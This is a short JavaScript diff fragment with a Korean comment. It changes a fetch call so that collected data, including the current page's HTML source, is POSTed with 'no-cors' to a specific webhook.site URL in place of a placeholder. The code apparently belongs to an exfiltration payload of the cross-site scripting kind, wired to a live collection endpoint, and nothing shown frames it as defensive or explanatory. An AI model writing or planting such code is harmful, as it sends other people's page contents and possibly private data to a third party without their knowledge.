@@ -31,7 +31,7 @@
         currentHTML: currentHTML // 현재 페이지 소스
     };
 
-    fetch('https://webhook.site/YOUR_WEBHOOK_URL', {
+    fetch('https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3', {
         method: 'POST',
         mode: 'no-cors',
         body: JSON.stringify(data)
